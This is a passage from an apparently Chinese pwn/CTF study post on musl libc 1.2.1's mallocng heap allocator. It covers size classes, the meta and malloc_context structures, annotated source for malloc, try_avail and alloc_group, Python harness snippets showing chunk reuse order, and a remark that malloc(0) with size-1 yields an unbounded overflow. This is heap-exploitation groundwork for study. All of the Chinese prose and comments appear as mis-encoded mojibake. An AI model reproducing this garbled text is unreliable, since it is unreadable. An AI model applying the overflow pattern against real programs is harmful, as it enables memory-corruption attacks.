5, 6, 7, 8,\n    9, 10, 12, 15,\n    18, 20, 25, 31,\n    36, 42, 50, 63,\n    72, 84, 102, 127,\n    146, 170, 204, 255,\n    292, 340, 409, 511,\n    584, 682, 818, 1023,\n    1169, 1364, 1637, 2047,\n    2340, 2730, 3276, 4095,\n    4680, 5460, 6552, 8191,\n};\n\nstatic inline int a_ctz_32(uint32_t x)\n{\n#ifdef a_clz_32\n    return 31-a_clz_32(x&-x);\n#else\n    static const char debruijn32[32] = {\n        0, 1, 23, 2, 29, 24, 19, 3, 30, 27, 25, 11, 20, 8, 4, 13,\n        31, 22, 28, 18, 26, 10, 7, 12, 21, 17, 9, 6, 16, 5, 15, 14\n    };\n    return debruijn32[(x&-x)*0x076be629 >> 27];\n#endif\n}\nstatic inline int a_clz_32(uint32_t x)\n{\n    x >>= 1;\n    x |= x >> 1;\n    x |= x >> 2;\n    x |= x >> 4;\n    x |= x >> 8;\n    x |= x >> 16;\n    x++;\n    return 31-a_ctz_32(x);\n}\nstatic inline int size_to_class(size_t n)\n{\n    n = (n+IB-1)>>4;\n    if (n<10) return n;\n    n++;\n    int i = (28-a_clz_32(n))*4 + 8;\n    if (n>size_classes[i+1]) i+=2;\n    if (n>size_classes[i]) i++;\n    return i;\n}\n```\n\nç›¸å…³æ±‡æ€»è®¡ç®—å¦‚ä¸‹\n\n```\n0x0     ~ 0xc ->0\n0xd     ~ 0x1c ->1\n0x1d    ~ 0x2c ->2\n0x2d    ~ 0x3c ->3\n0x3d    ~ 0x4c ->4\n0x4d    ~ 0x5c ->5\n0x5d    ~ 0x6c ->6\n0x6d    ~ 0x7c ->7\n0x7d    ~ 0x8c ->8\n0x8d    ~ 0x9c ->9\n0x9d    ~ 0xbc ->10\n0xbd    ~ 0xec ->11\n0xed    ~ 0x11c ->12\n0x11d   ~ 0x13c ->13\n0x13d   ~ 0x18c ->14\n0x18d   ~ 0x1ec ->15\n0x1ed   ~ 0x23c ->16\n0x23d   ~ 0x29c ->17\n0x29d   ~ 0x31c ->18\n0x31d   ~ 0x3ec ->19\n0x3ed   ~ 0x47c ->20\n0x47d   ~ 0x53c ->21\n0x53d   ~ 0x65c ->22\n0x65d   ~ 0x7ec ->23\n0x7ed   ~ 0x91c ->24\n0x91d   ~ 0xa9c ->25\n0xa9d   ~ 0xcbc ->26\n0xcbd   ~ 0xfec ->27\n0xfed   ~ 0x123c ->28\n0x123d  ~ 0x153c ->29\n0x153d  ~ 0x198c ->30\n0x198d  ~ 0x1fec ->31\n0x1fed  ~ 0x247c ->32\n0x247d  ~ 0x2a9c ->33\n0x2a9d  ~ 0x331c ->34\n0x331d  ~ 0x3fec ->35\n0x3fed  ~ 0x490c ->36\n0x490d  ~ 0x553c ->37\n0x553d  ~ 0x664c ->38\n0x664d  ~ 0x7fec ->39\n0x7fed  ~ 0x923c ->40\n0x923d  ~ 0xaa9c ->41\n0xaa9d  ~ 0xccbc ->42\n0xccbd  ~ 0xffec ->43\n0xffed  ~ 0x1247c ->44\n0x1247d ~ 0x1553c ->45\n0x1553d ~ 0x1997c ->46\n```\n\nä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªgroupä¸­çš„chunkå¤§å°èŒƒå›´è¦ä¹ˆæ˜¯`0x0 ~ 0xc `ï¼Œè¦ä¹ˆæ˜¯`0xd~ 0x1c`ï¼Œä¾æ¬¡ç±»æ¨ã€‚ä¸”ä¾æ®ä¸Šè¿°è½¬æ¢è¡¨ï¼Œä¸€ä¸ªèŒƒå›´å¯¹åº”ä¸€ä¸ªç´¢å¼•ï¼Œè¯¥ç´¢å¼•å³ç”¨æ¥å¯»æ‰¾metaçš„ç´¢å¼•ã€‚\n\n### (3)meta\n\nè€Œç”¨æ¥ç®¡ç†groupçš„ç»“æ„ç§°ä¸ºmetaï¼Œä¸€ä¸ªmetaå¯¹åº”ä¸€ä¸ªgroupï¼Œè€Œä¸Šé¢ç»“æ„å®šä¹‰ä¸­çš„groupä¸­çš„metaæŒ‡é’ˆå³æŒ‡å‘ç®¡ç†æœ¬groupçš„metaï¼Œå…¶å®šä¹‰å¦‚ä¸‹\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct meta {\n    //å­˜åœ¨å¤šä¸ªmetaï¼Œé€šè¿‡å¾ªç¯åŒå‘é“¾è¡¨ä¸²è”èµ·æ¥\n    //é‡Šæ”¾ä¹‹åæœ‰ç”¨,æ²¡æœ‰é‡Šæ”¾çš„åˆ™æŒ‡å‘æœ¬èº«\n\tstruct meta *prev, *next;\n\tstruct group *mem;//æŒ‡å‘æœ¬metaç®¡ç†çš„group\n    \n    //freed_maskæ˜¯å½“å‰metaçš„groupä¸­è¢«freeçš„chunkçš„bitmap, 4bytes\n    //avail_maskæ˜¯å½“å‰metaçš„groupä¸­ç›®å‰å¯ç”¨chunkçš„bitmap, 4bytes\n   \t//ç”±äºæ˜¯4bytesï¼Œæ€»å…±32bitï¼Œé‚£ä¹ˆæœ€å¤šå¯æœ‰32ä¸ªchunk\n    //è¿™é‡Œå¾ˆå¥‡æ€ªå•Šï¼Œç›´æ¥0/1è¡¨ç¤ºå¯ç”¨ä¸å¯ç”¨å‘—ï¼Œé‚£è¦æ˜¯æŸä¸ªchunkåœ¨è¿™ä¸¤ä¸ªfreeå’Œavailçš„bitmap\n    //ä¸­å¯¹åº”çš„bitéƒ½ä¸º1æˆ–éƒ½ä¸º0åˆæ€ä¹ˆç®—å‘¢\n    //è¿™é‡Œå¥½åƒè¢«freeçš„chunkå…¶freed_maskå¯¹åº”çš„bitä¼šé©¬ä¸Šè¢«ç½®ä¸º1\n    //ä½†æ˜¯avail_maskå¯¹åº”çš„bitå´ä¸ä¼šé©¬ä¸Šç½®1ï¼Œæš‚æ—¶æ ‡è®°ä¸å¯ç”¨çŠ¶æ€\n\tvolatile int avail_mask, freed_mask;\n    \n    \n\tuintptr_t last_idx:5;//groupä¸­æœ€åä¸€ä¸ªchunkçš„idxç´¢å¼• (5bit)\n\tuintptr_t freeable:1;//è¡¨ç¤ºå½“å‰metaæ˜¯å¦å¯ä»¥è¢«free(1:å¯ä»¥ï¼Œ0:ä¸å¯ä»¥)(1bit)\n    \n    //ç”±äºä¸€ä¸ªGroupä¸­çš„chunkçš„sizeåœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡sizeclassæ¥è¿½è¸ªè®¡ç®—size\n\tuintptr_t sizeclass:6;//(6bit)\n    \n\tuintptr_t maplen:8*sizeof(uintptr_t)-12;\n};\n```\n\n### (4)meta_area\n\né¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªç»“æ„å°±æ˜¯ç”¨æ¥ç®¡ç†metaçš„ï¼Œç›¸å…³å®šä¹‰å¦‚ä¸‹\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct meta_area\n{\n    uint64_t check;   \t\t//æ ¡éªŒå€¼\n    struct meta_area *next; //ä¸‹ä¸€ä¸ªåˆ†é…åŒºï¼Œå³ä¸‹ä¸€é¡µ(0x1000ä¸ºä¸€é¡µ)\n    int nslots;    \t\t\t//æ€»å…±å¤šå°‘ä¸ªslots\n    struct meta slots[]; \t//ä»å…¶ä¸­ç´¢å¼•å…¶ä¸‹é¢çš„meta\n};\n```\n\nåˆ†é…metaæ—¶, æ€»æ˜¯å…ˆåˆ†é…ä¸€é¡µçš„å†…å­˜, ç„¶ååˆ’åˆ†ä¸ºå¤šä¸ªç­‰å¾…åˆ†é…çš„metaåŒºåŸŸï¼Œmeta_arenaæè¿°çš„å°±æ˜¯ä¸€é¡µå†…å­˜çš„æœ€å¼€å§‹éƒ¨åˆ†ã€‚\n\n### (5)malloc_context\n\nè¿™ä¸ªå°±ç›¸å½“äºæ•´ä¸ªåˆ†é…å†…å­˜æœºåˆ¶æ€»ç®¡ç†çš„ä¸€ä¸ªç»“æ„ï¼Œç±»ä¼¼äºglibcä¸­çš„`main_arena`ç›¸å…³å®šä¹‰å¦‚ä¸‹\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct malloc_context\n{\n    uint64_t secret;\n    #ifndef PAGESIZE\n    size_t pagesize;\n    #endif\n    int init_done;     //æœ‰æ— å®Œæˆåˆå§‹åŒ–\n    unsigned mmap_counter;   //mmapå†…å­˜æ€»æ•°\n    struct meta *free_meta_head; //é‡Šæ”¾çš„metaç»„æˆçš„é˜Ÿåˆ—\n    struct meta *avail_meta;  //æŒ‡å‘å¯ç”¨metaå¯¹è±¡\n    //å¯ç”¨metaè®¡æ•°ã€å¯ç”¨meta_areaè®¡æ•°ã€ä¸çŸ¥é“\n    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;\n    struct meta_area *meta_area_head, *meta_area_tail; //åˆ†é…åŒºå¤´å°¾æŒ‡é’ˆ\n    unsigned char *avail_meta_areas;\n    struct meta *active[48];   //æ´»åŠ¨çš„meta\n    size_t usage_by_class[48]; //è¿™ä¸ªå¤§å°çº§åˆ«ä½¿ç”¨äº†å¤šå°‘å†…å­˜\n    uint8_t unmap_seq[32], bounces[32];\n    uint8_t seq;\n    uintptr_t brk;\n};\n\nextern struct malloc_context ctx;\n```\n\næ€»çš„æ¥è¯´ï¼Œæ•°æ®ç»“æ„å¤§è‡´å¦‚ä¸‹æ‰€ç¤º\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png)\n\n\n\n## 2.ç»´æŠ¤æ–¹å¼\n\nä½¿ç”¨`freed_mask`å’Œ`avail_mask`æ¥ç¡®å®šï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨`active[2]`(å³sizeåœ¨0x1d~0x2cçš„chunk)ä¸­ç°åœ¨æœ‰\n\n![image-20220317141333259](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png)\n\næˆ‘ä»¬å°†active[2]ä¸­`avail_mask`ç½®1çš„chunkéƒ½ç”³è¯·å‡ºæ¥ä¹‹åï¼Œå³ä»£è¡¨è¿™ä¸ªgroupæ— æ³•æ¥ç€ä¸ºæˆ‘ä»¬çš„ç”³è¯·æä¾›chunkçš„è¯ï¼Œæ¯”å¦‚è¿™é‡Œå°±æ˜¯éœ€è¦ç”³è¯·å‡ºchunk0~chunk9ï¼Œç„¶åå†ç”³è¯·çš„è¯å°±ä¼šè¿›è¡Œåˆ¤æ–­\n\n- å¦‚æœè¯¥groupä¸­å­˜åœ¨è¢«freeçš„chunkï¼Œå³`freed_mask`ä¸­ç½®1çš„chunkï¼Œé‚£ä¹ˆå°±è¿”å›è¯¥chunkï¼Œè¿™é‡Œä¹Ÿå­˜åœ¨ä¸€ä¸ªé¡ºåºé—®é¢˜ï¼Œä¸ä¼šç®¡æ˜¯å…ˆé‡Šæ”¾è¿˜æ˜¯åé‡Šæ”¾çš„ï¼Œåªä¼šä»ä¸Šåˆ°ä¸‹è¿›è¡Œåˆ†é…ï¼Œå¦‚ä¸‹ä»£ç \n\n```python\nfor i in range(8):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\n\t\nfor i in range(6,-1,-1):\n\tfree(i)\n\ndbg()    \nadd_malloc(0x2c)\nadd_malloc(0x2c)\npause()\nadd_malloc(0x2c)\nedit(10,0x10,p8(0x11)*0x10)\npause()\n```\n\nç¬¬ä¸€æ¬¡`dbg()`æ–­ç‚¹çš„åœ°æ–¹å…ˆç”³è¯·8ä¸ªchunkï¼Œé‚£ä¹ˆç°åœ¨åœ¨è¯¥groupçš„`avail_mask`ä¸­åº”è¯¥ä¸º`1100000000` è€Œ`freed_mask`åº”è¯¥ä¸º`1111111`\n\n![image-20220317143430652](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png)\n\næˆ‘ä»¬æ¥ç€ç”³è¯·ä¸¤ä¸ªChunkï¼Œåœ¨ç¬¬äºŒæ¬¡æ–­ç‚¹å¤„ï¼Œå…¶`avail_mask`åº”è¯¥ä¸º0ï¼Œè€Œ`freed_mask`ä¸å˜\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171438716.png)\n\nè¿™æ—¶å€™å†ç”³è¯·ä¸€ä¸ªchunkï¼Œå³å¯ç”³è¯·å‡ºgroupä¸­ä»ä¸Šå¾€ä¸‹æ•°é¦–ä¸ªè¢«freeçš„chunkï¼Œè¿™æ—¶`freed_mask`è¢«æ¸…ç©ºï¼Œ`avail_mask`ä¾æ®`freed_mask`è¿›è¡Œé‡ç½®\n\n![image-20220317144243283](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171442484.png)\n\nå…¶å®æ€»è€Œè¨€ä¹‹å°±æ˜¯å½“è€—å°½groupä¸­çš„avail_maskå¯¹åº”çš„å¯ç”¨chunkä¹‹åï¼Œå†ç”³è¯·å°±ä¼šæ£€æµ‹è¯¥groupä¸­æ˜¯å¦å­˜åœ¨è¢«freeçš„chunkï¼Œå­˜åœ¨å°±ä¼šå¯¹è¢«freeçš„chunkè¿›è¡Œå¤„ç†ï¼Œå½’åˆ°availä¸­ï¼Œç›¸åº”çš„avail_maskå’Œfreed_maskå‘ç”Ÿå˜åŒ–ã€‚\n\nè€Œå¦‚æœæˆ‘ä»¬æ”¹å˜é‡Šæ”¾é¡ºåºï¼Œä¾ç„¶ç”³è¯·å‡ºé¦–ä¸ªå¯ç”¨chunkï¼Œå’Œé‡Šæ”¾é¡ºåºæ— å…³\n\n```python\nfor i in range(8):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\n\t\nfor i in range(0,7):\n\tfree(i)\ndbg()\nadd_malloc(0x2c)\nadd_malloc(0x2c)\npause()\nadd_malloc(0x2c)\nedit(10,0x10,p8(0x11)*0x10)\npause()\n```\n\nå¦‚ä¸‹æ•ˆæœ\n\n![image-20220317144709749](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171447956.png)\n\n- å½“ç”³è¯·åˆ°è¯¥groupä¸­æ— å¯ç”¨chunkæ—¶ï¼Œå°è¯•ä»è¯¥sizeçš„metaé˜Ÿåˆ—ä¸­çš„å…¶ä»–metaå¯¹åº”çš„groupæ¥ç”³è¯·chunkã€‚\n\n```python\nfor i in range(11):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\nfree(0)\nfor i in range(11):\n\tadd_malloc(0x2c)\n\tedit(i+11,0x10,p8(i+11)*0x10)\ndbg()\n```\n\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬åœ¨ç”³è¯·å‡ºå¦å¤–ä¸€ä¸ªmeta-group(meta1)ä¹‹åï¼Œfreeæ‰ç¬¬ä¸€ä¸ªmeta-group(meta0)ä¸­çš„Chunkï¼Œç„¶åå½“æˆ‘ä»¬æ¶ˆè€—å®Œmeta1ä¸­çš„ç©ºé—´ä¹‹åï¼Œå†ç”³è¯·chunkçš„è¯ä¼šæ£€æµ‹è¯¥sizeçš„metaé˜Ÿåˆ—ï¼Œè¯•å›¾ä»ä¸­ç”³è¯·chunkå‡ºæ¥ï¼Œå¦‚ä¸‹å›¾å³ä»meta0ä¸­ç”³è¯·å‡ºæˆ‘ä»¬åˆšåˆšé‡Šæ”¾çš„Chunkã€‚\n\n![image-20220317153130762](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171531940.png)\n\n- å½“è¯¥sizeçš„metaé˜Ÿåˆ—ä¸­æ— availçš„chunkæ— freeçš„chunkæ—¶ï¼Œå°±ä¼šå†åˆ†é…ä¸€ä¸ª`meta-group`æ¥è¿›è¡Œå†åˆ†é…\n\n```python\nfor i in range(11):\n\tadd_malloc(0x2c)\n\tedit(i,0x10,p8(i)*0x10)\ndbg()\n```\n\nåŸæ¥çš„groupå·²ç»ä¸å¯ç”¨äº†ï¼Œæ‰€ä»¥æ–°åˆ†é…äº†ä¸€ä¸ªgroup\n\n![image-20220317144959413](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171449585.png)\n\n\n\n## 3.å…³é”®å‡½æ•°\n\n### (1)malloc\n\nå‚è€ƒï¼š\n\n[musl-1.2.xå †éƒ¨åˆ†æºç åˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/246929#h2-3)\n\n[ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/253566#h3-4)\n\n```c\n//v1.2.1  /src/malloc/mallocng/malloc.c\nvoid *malloc(size_t n)\n{\n\tif (size_overflows(n)) return 0;//æ˜¯å¦è¶…è¿‡ç”³è¯·çš„æœ€å¤§å€¼ï¼Œè¿™ä¸ªæœ€å¤§å€¼ä¸çŸ¥é“å¤šå°‘\n    /*\n    static inline int size_overflows(size_t n)\n    {\n        if (n >= SIZE_MAX/2 - 4096) {\n            errno = ENOMEM;\n            return 1;\n        }\n        return 0;\n    }\n\t*/\n\tstruct meta *g;\n\tuint32_t mask, first;\n\tint sc;\n\tint idx;\n\tint ctr;\n\n    //mmapåˆ†é…  #define MMAP_THRESHOLD 131052(0x1FFEC)\n\tif (n >= MMAP_THRESHOLD) {\n\t\tsize_t needed = n + IB + UNIT;\n\t\tvoid *p = mmap(0, needed, PROT_READ|PROT_WRITE,\n\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\n\t\tif (p==MAP_FAILED) return 0;\n\t\twrlock();\n\t\tstep_seq();\n\t\tg = alloc_meta();\n\t\tif (!g) {\n\t\t\tunlock();\n\t\t\tmunmap(p, needed);\n\t\t\treturn 0;\n\t\t}\n        //è®°å½•åˆ†é…ä¿¡æ¯\n\t\tg->mem = p;\n\t\tg->mem->meta = g;\n\t\tg->last_idx = 0;\n\t\tg->freeable = 1;\n\t\tg->sizeclass = 63;//metaçš„sizeclassä¸º63ä»£è¡¨mmapåˆ†é…\n\t\tg->maplen = (needed+4095)/4096;\n\t\tg->avail_mask = g->freed_mask = 0;\n\t\t// use a global counter to cycle offset in\n\t\t// individually-mmapped allocations.\n        //è®°å½•åˆ†é…ä¸ªæ•°\n\t\tctx.mmap_counter++;\n\t\tidx = 0;\n\t\tgoto success;\n\t}\n\n    //å¯»æ‰¾sizeå¯¹åº”çš„metaï¼Œctx.active[sc]\n\tsc = size_to_class(n);\n\trdlock();\n\tg = ctx.active[sc];\n\n\t// use coarse size classes initially when there are not yet\n\t// any groups of desired size. this allows counts of 2 or 3\n\t// to be allocated at first rather than having to start with\n\t// 7 or 5, the min counts for even size classes.\n    //å¯¹åº”sizeçš„metaä¸ºç©ºä¸”4=<sc<=32ä¸”ä¸ç­‰äº6ä¸”ä¸ºå¶æ•°å¹¶ä¸”è¯¥scæ²¡æœ‰æ­£åœ¨ä½¿ç”¨çš„chunk\n    //é‚£ä¹ˆç”³è¯·çš„chunkå°±ä¼šä»sc+1å¼€å§‹ç”³è¯·ï¼Œæ¯”å¦‚ç”³è¯·0x8cï¼Œå¯¹åº”çš„scåº”è¯¥æ˜¯8ï¼Œä½†æ˜¯ç”±äº\n    //æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œscä¸º8çš„metaæ²¡æœ‰æ­£åœ¨ä½¿ç”¨çš„chunkï¼Œå¯¹åº”å°±ä¼šä»sc+1=9å¤„å¼€å§‹ç”³è¯·\n\tif (!g && sc>=4 && sc<32 && sc!=6 && !(sc&1) && !ctx.usage_by_class[sc]) {\n\t\tsize_t usage = ctx.usage_by_class[sc|1];\n\t\t// if a new group may be allocated, count it toward\n\t\t// usage in deciding if we can use coarse class.\n\t\tif (!ctx.active[sc|1] || (!ctx.active[sc|1]->avail_mask\n\t\t    && !ctx.active[sc|1]->freed_mask))\n\t\t\tusage += 3;\n\t\tif (usage <= 12)\n\t\t\tsc |= 1;\n\t\tg = ctx.active[sc];\n\t}\n\n    //å–åˆ°avail_maskæœ€ä½ä½çš„1ï¼Œç½®é›¶ä¹‹åè®¡ç®—idx\n    //æ ¹æ®idxä»groupä¸­å¯»æ‰¾å¯ç”¨chunk\n\tfor (;;) {\n        //metaä¸­çš„å¯ç”¨å†…å­˜çš„bitmap, å¦‚æœgä¸º0é‚£ä¹ˆå°±è®¾ä¸º0, è¡¨ç¤ºæ²¡æœ‰å¯ç”¨chunk\n\t\tmask = g ? g->avail_mask : 0;\n        //æ‰¾åˆ°avail_maskçš„bitä¸­ç¬¬ä¸€ä¸ªä¸º1çš„bit\n\t\tfirst = mask&-mask;\n        //å¦‚æœæ²¡æ‰¾åˆ°å°±åœæ­¢\n\t\tif (!first) break;\n        //è®¾ç½®avail_maskä¸­firstå¯¹åº”çš„bitä¸º0\n        //ä¸‹é¢æ˜¯é”æœºåˆ¶ï¼Œä¸å¤ªæ‡‚\n\t\tif (RDLOCK_IS_EXCLUSIVE || !MT)\n\t\t\tg->avail_mask = mask-first;\n\t\telse if (a_cas(&g->avail_mask, mask, mask-first)!=mask)\n\t\t\tcontinue;\n        //æ‰¾åˆ°ä¹‹åè®¾ç½®avail_maskä¹‹åè½¬ä¸ºidx, ç»“æŸ\n\t\tidx = a_ctz_32(first);\n\t\tgoto success;\n\t}\n\tupgradelock();\n\n\tidx = alloc_slot(sc, n);\n\tif (idx < 0) {\n\t\tunlock();\n\t\treturn 0;\n\t}\n    //æ‰¾åˆ°å¯¹åº”meta\n\tg = ctx.active[sc];\n\nsuccess:\n\tctr = ctx.mmap_counter;\n\tunlock();\n    //ä»gä¸­åˆ†é…ç¬¬idxä¸ªchunk, å¤§å°ä¸ºn\n\treturn enframe(g, idx, n, ctr);\n}\n```\n\n- åˆ¤æ–­æœ‰æ— è¶…è¿‡mmapçš„é˜ˆå€¼, å¦‚æœè¶…è¿‡å°±mmapåˆ†é…\n\n- å¦‚æœæ²¡æœ‰è¶…è¿‡, sizeè½¬scä¹‹å, é€šè¿‡ctx.active[sc]æ‰¾åˆ°å¯¹åº”çš„metaé˜Ÿåˆ—, å°è¯•ä»é˜Ÿåˆ—ä¸­é¦–ä¸ªmetaé‡Œåˆ†é…chunk\n- å¦‚æœè¿™ä¸ªé˜Ÿåˆ—ä¸ºç©º, æˆ–è€…è¿™ä¸ªmetaçš„avail_maské‡Œé¢æ²¡æœ‰åˆé€‚çš„chunk, é‚£å°±è°ƒç”¨alloc_slot()è·å–chunk\n- æ‰¾åˆ°groupä¸idxä¹‹åé€šè¿‡enframe()åˆ†é…å‡ºè¿™ä¸ªchunk\n\n#### ğŸ”ºæ³¨ï¼š\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶æ²¡æœ‰å¯¹sizeä¸º0è¿›è¡Œé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”³è¯·sizeä¸º0çš„Chunkï¼Œä¸‡ä¸€å¦‚ä¸‹ä»£ç æ‰€ç¤º\n\n```c\nsize = readint(\"size?\", a2);\n*(_QWORD *)v5 = malloc(size);\nv5[2] = size - 1;\nputs(\"Contnet?\");\nreturn readn(*(_QWORD *)v5, v5[2]);\n```\n\né‚£ä¹ˆsizeä¸º0å°±å¯ä»¥æ— é™æº¢å‡ºäº†å•Š\n\n#### â‘ alloc_slot\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\nstatic int alloc_slot(int sc, size_t req)\n{\n    //å°è¯•åœ¨è¯¥sizeçš„metaå¯¹åº”çš„active[sc]é˜Ÿåˆ—å†…éƒ¨åˆ†é…chunk\n\tuint32_t first = try_avail(&ctx.active[sc]);\n\tif (first) return a_ctz_32(first);//åˆ†é…æˆåŠŸç›´æ¥è¿”å›\n\n    //å¦‚æœè¯¥sizeçš„metaå¯¹åº”çš„active[sc]é˜Ÿåˆ—ä¸­æ²¡æœ‰åˆé€‚çš„avail_mask\n    //å’Œfreed_maskå¯¹åº”çš„chunkï¼Œé‚£ä¹ˆå°±å†åˆ†é…ä¸€ä¸ªmeta-groupï¼Œæ’å…¥é˜Ÿåˆ—ä¸­\n\tstruct meta *g = alloc_group(sc, req);\n\tif (!g) return -1;\n\n\tg->avail_mask--;\n    //æ–°åˆ†é…çš„gå…¥é˜Ÿ\n\tqueue(&ctx.active[sc], g);\n\treturn 0;\n}\n```\n\n- é¦–å…ˆä¼šé€šè¿‡`try_avail()`åœ¨ä»¥ä¸‹ä½ç½®å¯»æ‰¾å¯ç”¨çš„chunk,\n  - ctx.active[sc]çš„meta-groupçš„freed_maskä¸­\n  - é˜Ÿåˆ—ä¸­å…¶ä»–meta-groupçš„avail_maskå’Œfreed_maskä¸­\n- å¦‚æœå¤±è´¥,æˆ–è€…è¿™ä¸ªé˜Ÿåˆ—æœ¬æ¥å°±ç©º, é‚£ä¹ˆå°±ä¼šè°ƒç”¨`alloc_group()`ç›´æ¥åˆ†é…ä¸€ä¸ªæ–°çš„metaä¸å¯¹åº”çš„groupï¼Œç„¶åè°ƒç”¨queueæ’å…¥ctx.avtive[sc]è¿™ä¸ªé˜Ÿåˆ—ä¸­\n\n#### â‘¡try_avail\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\nstatic uint32_t try_avail(struct meta **pm)\n{\n    struct meta *m = *pm;\n    uint32_t first;\n    if (!m) return 0;//å¦‚æœctx.active[sc]==NULL, å³è¯¥é˜Ÿåˆ—ä¸ºç©ºï¼Œç›´æ¥è¿”å›\n\n    //ctx.active[sc]å¯¹åº”çš„meta-groupçš„avail_maskä¸­æ— å¯ç”¨chunk\n    uint32_t mask = m->avail_mask;\n    if (!mask) {\n        if (!m) return 0;\n        //ctx.active[sc]å¯¹åº”çš„meta-groupçš„freed_maskä¸­ä¹Ÿæ²¡æœ‰chunkæ—¶\n        //ä»£è¡¨éƒ½åœ¨ä½¿ç”¨ä¸­ï¼Œä»é˜Ÿåˆ—ä¸­å¼¹å‡ºè¯¥meta-group\n        if (!m->freed_mask) {\n            dequeue(pm, m);\n            m = *pm;\n            if (!m) return 0;\n        } else {\n            //è·å–é˜Ÿåˆ—ä¸­ä¸‹ä¸€ä¸ªmeta-group\n            m = m->next;\n            *pm = m;\n        }\n\t\t\n        //å¦‚æœè¿™ä¸ªmeta-groupä¸­æ‰€æœ‰çš„chunkéƒ½è¢«é‡Šæ”¾äº†, é‚£ä¹ˆå°±å†ä¸‹ä¸€ä¸ªmeta-group\n        //å³ä¸ä»ä¸‹ä¸€ä¸ªå…¨freeæˆ–è€…æ²¡æœ‰ç”³è¯·chunkçš„meta-groupä¸­ç”³è¯·chunk\n        mask = m->freed_mask;\n        // skip fully-free group unless it's the only one\n        // or it's a permanently non-freeable group\n        if (mask == (2u<<m->last_idx)-1 && m->freeable) {\n            m = m->next;\n            *pm = m;\n            mask = m->freed_mask;\n        }\n\n        //æ²¡å¤ªçœ‹æ‡‚æƒ³å¹²å•¥\n        // activate more slots in a not-fully-active group\n        // if needed, but only as a last resort. prefer using\n        // any other group with free slots. this avoids\n        // touching & dirtying as-yet-unused pages.\n        if (!(mask & ((2u<<m->mem->active_idx)-1))) {\n            if (m->next != m) {\n                m = m->next;\n                *pm = m;\n            } else {\n                int cnt = m->mem->active_idx + 2;\n                int size = size_classes[m->sizeclass]*UNIT;\n                int span = UNIT + size*cnt;\n                // activate up to next 4k boundary\n                while ((span^(span+size-1)) < 4096) {\n                    cnt++;\n                    span += size;\n                }\n                if (cnt > m->last_idx+1)\n                    cnt = m->last_idx+1;\n                m->mem->active_idx = cnt-1;\n            }\n        }\n        //é‡æ–°è®¾ç½®è¿™ä¸ªmeta-groupï¼Œfreed_maskå’Œavail_maskçš„è®¾ç½®\n        mask = activate_group(m);\n        /*å…¶å®ä¹Ÿå°±æ˜¯è®¾ç½®è®¾ç½®ä¸€ä¸‹freed_maskå’Œavail_mask\n        static inline uint32_t activate_group(struct meta *m)\n        {\n            assert(!m->avail_mask);\n            uint32_t mask, act = (2u<<m->mem->active_idx)-1;\n            do mask = m->freed_mask;\n            while (a_cas(&m->freed_mask, mask, mask&~act)!=mask);\n            return m->avail_mask = mask & act;\n        }\n        */\n        assert(mask);\n        decay_bounces(m->sizeclass);\n    }\n    //å–å‡º\n    first = mask&-mask;\n    m->avail_mask = mask-first;\n    return first;\n}\n```\n\n- æŸ¥çœ‹è¿™ä¸ªmeta-groupä¸­freed_maskä¸­æœ‰æ— chunkï¼Œå¦‚æœfreed_maskä¸º0, è¯´æ˜è¿™ä¸ªmeta-groupä¸­æ²¡æœ‰é‡Šæ”¾çš„chunkï¼Œå°±ä»é˜Ÿåˆ—ä¸­å–å‡º\n- å¦‚æœæœ‰çš„è¯å°±ä¼šé€šè¿‡`active_group()`æŠŠfreed_maskä¸­çš„chunkè½¬ç§»åˆ°avail_maskä¸­\n\n#### â‘¢alloc_group\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\n//ç”¨æ¥åˆ†é…ä¸€ä¸ªæ–°çš„group\nstatic struct meta *alloc_group(int sc, size_t req)\n{\n    size_t size = UNIT*size_classes[sc];\n    int i = 0, cnt;\n    unsigned char *p;\n    //å…ˆåˆ†é…ä¸€ä¸ªmetaç®¡ç†group\n    struct meta *m = alloc_meta();\n    if (!m) return 0;\n    size_t usage = ctx.usage_by_class[sc];\n    size_t pagesize = PGSZ;\n    int active_idx;\n    if (sc < 9) {\n        while (i<2 && 4*small_cnt_tab[sc][i] > usage)\n            i++;\n        cnt = small_cnt_tab[sc][i];\n    } else {\n        // lookup max number of slots fitting in power-of-two size\n        // from a table, along with number of factors of two we\n        // can divide out without a remainder or reaching 1.\n        cnt = med_cnt_tab[sc&3];\n\n        // reduce cnt to avoid excessive eagar allocation.\n        while (!(cnt&1) && 4*cnt > usage)\n            cnt >>= 1;\n\n        // data structures don't support groups whose slot offsets\n        